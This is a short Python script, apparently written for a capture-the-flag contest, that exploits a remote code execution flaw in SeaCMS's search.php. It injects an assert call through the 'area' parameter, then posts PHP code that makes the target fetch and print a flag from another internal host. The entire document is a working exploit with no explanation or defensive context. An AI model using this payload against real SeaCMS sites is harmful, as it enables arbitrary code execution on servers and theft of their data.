#!/usr/bin/env python
# encoding:utf-8

'''
Get flag by RCE of seacms
'''

import requests

def get_flag(host, port):
    url = "http://%s:%d/search.php?searchtype=5&tid=&area=$_GET[d]($_POST[c])&d=base64_decode('%s')" % (host, port, "assert".encode("base64"))
    data = {"c":"print_r(file_get_contents('http://172.16.0.30:8000/flag'));"}
    content = requests.post(url, data=data).content
    print content
    flag = content[0:38]
    print flag
    return flag

if __name__ == "__main__":
    get_flag("172.16.0.185", 80)

